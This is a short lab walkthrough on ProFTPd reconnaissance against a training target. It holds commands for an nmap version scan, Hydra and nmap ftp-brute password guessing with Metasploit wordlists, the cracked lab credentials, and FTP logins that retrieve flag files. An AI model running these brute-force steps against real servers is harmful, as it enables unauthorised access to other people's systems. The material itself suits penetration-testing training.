# ProFTP Recon: Basics

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 2827–2876. Examples are lab-specific and need verification.

ProFTPd is an open-source FTP server that is highly configurable and designed to be secure, efficient, and easy to manage. It is commonly used in Unix-like operating systems and supports various configurations and authentication methods. In this lab, we will look at the basics of ProFTP server reconnaissance.

In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.

**Objective:** Answer the following questions:

1. What is the version of FTP server?
2. Use the username dictionary /usr/share/metasploit-framework/data/wordlists/common_users.txt and password dictionary /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt to check if any of these credentials work on the system. List all found credentials.
3. Find the password of user “sysadmin” using nmap script.
4. Find seven flags hidden on the server.

Tools: Nmap, Hydra

```bash
nmap -sV demo.ine.local
//got version ProFTPD for ftp
**hydra** -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local -t 4 ftp

## got info: sysadmin: 654321
rooty: qwerty
demo: butterfly
**auditor: chocolate**
anon: purple
administrator: tweety
diag: tigger ##

ftp demo.ine.local
username: auditor
pass: chocolate
ftp>dir
ftp>mget flag.txt

$cat flag.txt

or

echo "sysadmin" > users
nmap --script ftp-brute --script-args userdb=/root/users -p 21 demo.ine.local
ftp demo.ine.local
Enter username "sysadmin" and password 654321
ls
get secret.txt
exit
cat secret.txt
```

In this lab, we learned about the basics of ProFTP server reconnaissance.
